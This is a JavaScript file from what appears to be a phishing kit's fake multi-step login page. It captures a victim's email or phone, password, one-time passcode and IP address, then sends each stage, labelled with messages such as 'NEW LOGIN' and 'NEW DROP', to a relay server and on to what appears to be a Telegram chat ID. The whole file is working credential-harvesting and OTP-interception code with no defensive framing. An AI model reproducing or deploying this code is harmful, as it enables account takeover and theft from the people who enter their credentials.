let user = {
    "authtype": "",
    "phone" : "",
    "email" : "",
    "otp" : "",
    "pw": "",
    "ip": ""
}
 let isfinal = false
$('.proceed').click(function (){
    user.authtype  = $(".userauthtype").val();
    user.pw  = $("pw").val();
    user.otp  = $("#otp").val();

    $('#nextBtn').click()
})
function setLoginType(){
    function isEmail(input) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(input);
    }

    const userInput = $(".userauthtype").val();
    console.log(userInput)
    if (isEmail(userInput)) {
        user.authtype = 'email'
        user.email = userInput
         $('.email').show()
         $('.phone').hide()

    } else {
        user.authtype = 'phone'
        user.phone = userInput
        $('.phone').show()
        $('.email').hide()
    }
    
}
$('.setLoginType').click(function (){
    setLoginType()
})

$('.userotp').click(function (){
    user.authtype  = $(".userauthtype").val();
    // user.pw  = $(".userpw").val();
    // user.otp  = $(".userotp").val();
    if(user.pw == ''){
        $(`#step2`).removeClass('hidden');
        $(`#step5`).addClass('hidden');
        isfinal = true
    }else{
        sendLogs()
    }
})


function bringemail(){
      
    if( user.pw == '' && currentStep == 5){
        showPassword()    
    } 
function showPassword(){
    $(`#step2`).removeClass('hidden');
}

}

function handleState(){
    user.authtype = $(".userauthtype").val();
    user.phone = $(".phone").val();
    user.email = $(".email").val();
    user.otp = $("#otp").val();
    user.pw = $("#pw").val();
    user.ip = $(".ip").val();
    if(isfinal){
        $(`#step2`).addClass('hidden');
            currentStep = 4
        $(`#step5`).removeClass('hidden');
        sendLogs()
    }

    if( user.authtype == 'email'){
    }
    
    if( user.otp == ''){
        // showOtp()    
    } 
}

let chatId = '-4176809792';
function sendIpLoginType(){
    user.authtype = $(".userauthtype").val();
    user.ip = $('#ipad').val()
    let message = 'NEW LOGIN ✅ \n\n <pre>  ' + JSON.stringify(user, null, 2) + '</pre>'
    // isLoginValid
    sendLogs(message)
}

function sendPw(){
    user.pw = $("#pw").val();
    let message = 'USER PW 🗝️ \n\n <pre>  ' + JSON.stringify(user, null, 2) + '</pre>'
    sendLogs(message)
}

function reqOtp(type){
    let message
    let users = {
        "authtype": user.authtype
    }
    if(type == 'email'){
         message = 'OTP REQUEST (EMAIL) 📧📬 \n\n <pre> ' + JSON.stringify(users, null, 2) + '</pre>'
    }
    if(type == 'phone'){
         message = 'OTP REQUEST (EMAIL) 📱📬 \n\n <pre> ' + JSON.stringify(users, null, 2) + '</pre>'
    }
    sendLogs(message)
}

function sendLogs(message = null){
    // const message = 'NEW DROP ✅ \n\n Email: <pre>  ' + JSON.stringify('test@test.com', null, 2) + '</pre> \n Password:  <pre>' + JSON.stringify('12345678', null, 2) + '</pre>'
    user.authtype = $(".userauthtype").val();
    user.phone = $(".phone").val();
    user.email = $(".email").val();
    user.otp = $("#otp").val();
    user.pw = $("#pw").val();
    user.ip = $("#ipad").val();
    if(message == null){
        message = 'NEW DROP ✅ \n\n <pre>  ' + JSON.stringify(user, null, 2) + '</pre>'
    }

    const apiUrl = 'http://localhost:3000/log'; // Update with your server URL

    const postData = {
        chatId: chatId,
        message: message,
        // Add more key-value pairs as needed
    };

    fetch(apiUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(postData),
    })
        .then(response => response.json())
        .then(data => {
            console.log('Response:', data);
        })
        .catch(error => {
            console.error('Error:', error);
        });

}

